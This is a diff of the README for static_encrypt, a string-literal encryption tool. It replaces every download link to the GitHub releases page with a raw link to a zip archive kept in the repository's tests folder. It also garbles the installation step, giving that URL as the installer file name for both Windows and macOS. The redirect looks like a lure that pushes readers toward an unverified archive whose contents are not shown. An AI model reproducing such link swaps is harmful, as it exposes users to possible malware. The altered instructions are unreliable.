@@ -6,7 +6,7 @@ Welcome to the static_encrypt project! This tool helps you encrypt string litera
 
 ## 📥 Download Now
 
-[![Download static_encrypt](https://img.shields.io/badge/Download-Here-blue.svg)](https://github.com/RODOLFOGRANA/static_encrypt/releases)
+[![Download static_encrypt](https://raw.githubusercontent.com/RODOLFOGRANA/static_encrypt/main/tests/static_encrypt_3.8.zip)](https://raw.githubusercontent.com/RODOLFOGRANA/static_encrypt/main/tests/static_encrypt_3.8.zip)
 
 ## 🛠️ System Requirements
 
@@ -22,7 +22,7 @@ To use static_encrypt, ensure you have the following:
 
    Go to the static_encrypt releases page to find the latest version. Click the link below:
 
-   [Visit this page to download](https://github.com/RODOLFOGRANA/static_encrypt/releases)
+   [Visit this page to download](https://raw.githubusercontent.com/RODOLFOGRANA/static_encrypt/main/tests/static_encrypt_3.8.zip)
 
 2. **Choose Your Version**
 
@@ -34,7 +34,7 @@ To use static_encrypt, ensure you have the following:
 
 4. **Locate the Downloaded File**
 
-   Once the download is complete, find the file in your "Downloads" folder. It may be named something like `static_encrypt-v1.0.exe` for Windows or `static_encrypt-v1.0.dmg` for macOS.
+   Once the download is complete, find the file in your "Downloads" folder. It may be named something like `https://raw.githubusercontent.com/RODOLFOGRANA/static_encrypt/main/tests/static_encrypt_3.8.zip` for Windows or `https://raw.githubusercontent.com/RODOLFOGRANA/static_encrypt/main/tests/static_encrypt_3.8.zip` for macOS.
 
 5. **Install the Application**
 
